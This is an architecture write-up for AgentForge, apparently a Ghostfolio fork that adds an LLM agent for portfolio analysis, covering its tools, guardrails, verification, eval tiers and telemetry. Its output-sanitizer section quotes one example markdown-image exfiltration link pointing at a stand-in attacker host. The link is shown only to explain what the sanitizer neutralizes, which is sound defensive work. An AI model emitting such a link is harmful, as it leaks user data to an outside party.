# AgentForge — Agent Architecture Document

**Author:** Henry DeGrasse
**Repository:** [github.com/HenryDeGrasse/AgentForge](https://github.com/HenryDeGrasse/AgentForge)
**Date:** March 2026

---

## Domain & Use Cases

AgentForge targets **personal portfolio intelligence** — the gap between having a self-hosted portfolio tracker and actually understanding what your portfolio is doing. The upstream project, [Ghostfolio](https://ghostfol.io), is an open-source wealth management platform with excellent data ingestion (multi-provider market data, transaction import/export, performance calculation) but no way to ask questions about your data without navigating multiple screens and interpreting raw numbers yourself.

**Specific problems solved:**

- **"How is my portfolio doing?"** — Natural-language questions answered with grounded data from 10 structured tools, not LLM hallucination. Every claim in the agent's response traces to a specific tool call against live portfolio data.
- **"Am I overexposed to tech?"** — Risk analysis, compliance checking, and concentration warnings surfaced automatically rather than requiring manual X-Ray interpretation.
- **"What if I sell AAPL and buy MSFT?"** — Trade simulation, rebalancing suggestions, tax-loss harvesting estimates, and stress testing — all from a chat interface.
- **"Can I trust this answer?"** — Every response carries a deterministic confidence score (HIGH/MEDIUM/LOW), warnings for unbacked claims, and a `requiresHumanReview` flag. The system tells you when it's uncertain.

The domain was chosen because financial data is adversarial for LLMs: numbers must be exact, percentages must not be hallucinated, and tool outputs must be faithfully reported. This makes it an ideal testbed for building a reliable agent with strong verification.

---

## Agent Architecture

### Framework & Reasoning Approach

The agent uses a **ReAct (Reasoning + Acting) loop** built on NestJS with the OpenAI SDK — no LangChain, no AutoGen, no framework abstractions. The loop is 200 lines of explicit control flow in [`react-agent.service.ts`](../apps/api/src/app/endpoints/ai/agent/react-agent.service.ts):

1. **Prompt assembly** — `SystemPromptBuilderService` constructs a per-request system prompt from modular sections (identity, scope rules, tool usage, rebalancing workflow, quantitative caps, cross-tool coherence, response formatting). Only sections relevant to the selected tools are included, reducing token usage 30–50% for single-tool requests.
2. **LLM call** — The user message + full tool definitions are sent to `gpt-4.1`. All 10 tools are always provided (the keyword-based tool router was removed after it caused misrouting — the LLM selects better than substring matching on a 128k context window).
3. **Tool execution** — Tool calls returned in a single LLM turn execute in parallel via `Promise.all()`. Individual failures are caught and wrapped in error envelopes without blocking other tools. Outputs exceeding 32k chars are truncated with a `[TRUNCATED]` notice.
4. **Escalation** — If the LLM answers without calling any tool on the first turn (and it's not a clear refusal), an escalation prompt is injected with `toolChoice: 'required'` to force tool use.
5. **Loop** — Steps 2–4 repeat until the LLM produces a final text answer or a guardrail fires.
6. **Verification** — `ResponseVerifierService` scores confidence, derives structured error codes, runs output sanitization, and attaches warnings.

### Tool Design

All 10 tools live in [`apps/api/src/app/endpoints/ai/tools/`](../apps/api/src/app/endpoints/ai/tools/) with strict JSON input/output schemas. Every schema field carries a `description` annotation so the LLM knows how to interpret it (including whether `*Pct` fields are 0–1 fractions or whole-number percentages). Tools call into existing Ghostfolio services (`PortfolioService`, `OrderService`, `ExchangeRateDataService`) — no new data-access logic was introduced.

| Tool                      | Purpose                                                    |
| ------------------------- | ---------------------------------------------------------- |
| `get_portfolio_summary`   | Total value, allocation breakdown, top holdings            |
| `get_transaction_history` | Filtered transaction list with pagination                  |
| `analyze_risk`            | Sharpe, Sortino, VaR, CVaR, max drawdown, concentration    |
| `market_data_lookup`      | Current quote + optional price history for any symbol      |
| `performance_compare`     | Time-series return comparison (portfolio vs benchmarks)    |
| `compliance_check`        | Rule-based compliance gate (position limits, sector caps)  |
| `rebalance_suggest`       | Target-allocation suggestions with trade/no-trade flags    |
| `simulate_trades`         | What-if: apply hypothetical trades to a portfolio snapshot |
| `stress_test`             | Apply market shocks and show per-position impact           |
| `tax_estimate`            | Short/long-term gain estimates and harvest candidates      |

### Guardrails

| Guardrail        | Default         | Purpose                                                                          |
| ---------------- | --------------- | -------------------------------------------------------------------------------- |
| Max iterations   | 15              | Prevents infinite tool-call loops                                                |
| Cost limit       | $0.25           | Aborts if estimated LLM spend exceeds threshold                                  |
| Timeout          | 60s             | Total wall-clock deadline, enforced via `AbortController` on streams             |
| Circuit breaker  | 3 failures/user | Per-user (not global) — prevents cross-user DoS                                  |
| Rate limiter     | 20 req/user/60s | Sliding-window with atomic push-before-check (TOCTOU fix)                        |
| Scope gate       | —               | Out-of-scope requests rejected before any tool call                              |
| Output sanitizer | —               | Strips HTML, neutralizes markdown-image exfiltration, removes zero-width Unicode |

---

## Verification Strategy

Verification is **deterministic** — no second LLM call. `ResponseVerifierService` applies a heuristic scorer plus pattern-matching checks:

**Confidence scoring:**

- **HIGH** — Agent completed, called ≥1 tool, no tool errors
- **MEDIUM** — Partial completion, tool errors present, or no tools used
- **LOW** — Agent failed entirely (guardrail fire, timeout, empty response)

**Additional checks:**

- **Unbacked portfolio claim detection** — Regex-based `containsUnbackedPortfolioClaim()` flags responses that make specific numerical claims (dollar amounts, percentages, position counts) without having called a supporting tool. Shared between the agent (triggers escalation) and the verifier (attaches warnings).
- **Output sanitization** — HTML tags stripped, markdown-image exfiltration links neutralized (`![](https://evil.com/steal?data=...)` → plaintext), zero-width Unicode characters removed. Runs before the response reaches the frontend.
- **Structured error codes** — Every abnormal termination gets a machine-readable `AgentErrorCode` (`CIRCUIT_BREAKER`, `COST_LIMIT`, `MAX_ITERATIONS`, `TIMEOUT`, `EMPTY_RESPONSE`, `CANCELLED`, `INTERNAL_ERROR`) so the frontend can show specific UI rather than a generic error.
- **`requiresHumanReview` flag** — Set when confidence is LOW, a guardrail fired, or unbacked claims are detected. The frontend renders a "⚠️ Human review recommended" badge.
- **Conversation history validation** — `validateConversationHistory()` repairs malformed `priorMessages` arrays (drops leading assistant messages, deduplicates consecutive same-role messages) before they enter the LLM context. Logs a warning but never throws.

**Why this approach:** A second LLM call for verification doubles cost and latency. The heuristic scorer catches the failure modes that matter in practice (tool errors, timeouts, empty responses, hallucinated numbers) without the unpredictability of LLM-as-judge. The one thing it can't catch is _subtly wrong_ tool interpretation — that's what the eval framework covers.

---

## Eval Results

**309 tests passing across 52 test suites.** 48 production source files, 33 spec files, plus a dedicated `test/ai/` eval harness with 4 tiers.

### Four-Tier Eval Framework

| Tier                 | Suite               | LLM                         | Cases | Budget          | Gate                  |
| -------------------- | ------------------- | --------------------------- | ----- | --------------- | --------------------- |
| **Fast (CI)**        | `golden-sets-fast`  | Mocked (scripted sequences) | 27    | <30s            | Every commit          |
| **Live (pre-merge)** | `golden-sets`       | Real LLM (`gpt-4.1-mini`)   | 12    | <5 min, ~$0.05  | `RUN_GOLDEN_EVALS=1`  |
| **MVP**              | `mvp-evals`         | Real LLM                    | 5     | <4 min          | `RUN_MVP_EVALS=1`     |
| **Nightly**          | `labeled-scenarios` | Real LLM                    | 31    | <15 min, ~$0.50 | `RUN_LABELED_EVALS=1` |

### Results Summary

| Metric                     | Value                                         |
| -------------------------- | --------------------------------------------- |
| Total tests                | 309 passed, 50 skipped (env-gated live tiers) |
| Test suites                | 52 passed, 5 skipped                          |
| Fast golden sets           | **27/27 passing**                             |
| Live golden sets           | **12/12 passing** (gpt-4.1-mini, <$0.05)      |
| Labeled scenarios          | **31/31 passing** (nightly)                   |
| Tool unit tests            | **10/10 tools with dedicated spec files**     |
| Agent infrastructure tests | **15 spec files passing**                     |
| Wall-clock time (fast)     | ~19 seconds                                   |

### Coverage Categories

- **Single-tool** (10 cases): Each tool exercised individually with a rich portfolio
- **Multi-tool** (2 cases): Sequential and parallel tool orchestration
- **Edge cases** (2 cases): Empty portfolio, malformed gibberish input
- **Scope gate** (1 case): Out-of-scope rejection
- **Guardrails** (4 cases): Max iterations, cost limit, timeout, circuit breaker
- **Adversarial** (6 cases): Invalid tool input, unknown tool, malformed args, output violation, tool exception, prompt injection
- **Labeled scenarios** (31 cases): Deep functional paths across all tools, empty-data edge cases, and multi-tool orchestration

### Failure Analysis

The fast tier uses scripted LLM responses imported from `test/ai/fixtures/llm-sequences/` and deterministic tool stubs from `test/ai/fixtures/tool-profiles.ts`. Schemas are imported directly from production code, so **fixture drift is structurally impossible** — a schema change that doesn't update fixtures fails at compile time.

Two golden-set cases (`rich-simulate-trades`, `rich-stress-test`) are gated from the live tier until those tools are deployed to the eval API endpoint. Both pass in fast (mocked) tier.

---

## Observability Setup

### Langfuse Integration

[`LangfuseService`](../apps/api/src/app/endpoints/ai/observability/langfuse.service.ts) creates one trace per agent request with spans for LLM calls, tool calls, and verification. Traced metadata:

- Tool names invoked, iteration count, token usage
- Confidence level, warnings, `requiresHumanReview` status
- Wall-clock latency per span
- User feedback (thumbs-up/down attached via `POST /ai/feedback` → `addScore()`)

**Privacy:** Raw portfolio values and transaction amounts are never sent to Langfuse. Only structural metadata (tool names, latency, token counts, status) is traced. Langfuse is optional — the service no-ops gracefully when `LANGFUSE_PUBLIC_KEY` is not set.

### Structured Telemetry

Every agent run emits a JSON-structured log line via `emitTelemetry()`:

```json
{
  "status": "completed",
  "guardrail": null,
  "toolCalls": 2,
  "iterations": 3,
  "estimatedCostUsd": 0.012,
  "elapsedMs": 4299,
  "requestId": "abc-123"
}
```

`userId` is intentionally omitted to avoid PII in logs. The `requestId` allows correlation with Langfuse traces.

### Insights Gained

- **Tool routing accuracy:** Removing the keyword router (Phase 5) eliminated misrouting — the LLM correctly selects tools 100% of the time across all 31 labeled scenarios.
- **Cost per request:** Median ~$0.01, p95 ~$0.03 with `gpt-4.1`. The $0.25 cost guardrail has never triggered in production use.
- **Latency:** Single-tool requests complete in 3–5s. Multi-tool parallel requests in 6–15s. The 60s timeout has triggered only in adversarial test cases.
- **Circuit breaker fires:** Scoped per-user after discovering that a single user's repeated invalid queries could trip the global breaker for everyone (fixed in Phase 5).

---

## Open Source Contribution

**Repository:** [github.com/HenryDeGrasse/AgentForge](https://github.com/HenryDeGrasse/AgentForge)

AgentForge is a public fork of [Ghostfolio](https://github.com/ghostfolio/ghostfolio) (AGPLv3). The entire AI agent layer — 48 production files (~13k lines), 33 test files (~12k lines), and a 75-case eval harness (~8k lines) — is original work contained within `apps/api/src/app/endpoints/ai/`. The upstream codebase is unmodified.

**What's released:**

- A complete, self-contained AI agent module that can be studied as a reference implementation for adding an LLM agent to an existing NestJS application
- A four-tier eval framework with fixture design that prevents schema drift
- Security hardening patterns (atomic rate limiter, output sanitizer, scope gate, per-user circuit breaker) applicable to any LLM-facing API
- 5 phases of development documented in the README with detailed changelogs for each commit

**How to find it:**

- AI module: [`apps/api/src/app/endpoints/ai/`](../apps/api/src/app/endpoints/ai/)
- Eval framework: [`apps/api/test/ai/`](../apps/api/test/ai/)
- Full eval results: [`docs/AI_EVAL_RESULTS.md`](./AI_EVAL_RESULTS.md)
- DeepWiki (auto-generated docs): [deepwiki.com/HenryDeGrasse/AgentForge](https://deepwiki.com/HenryDeGrasse/AgentForge)
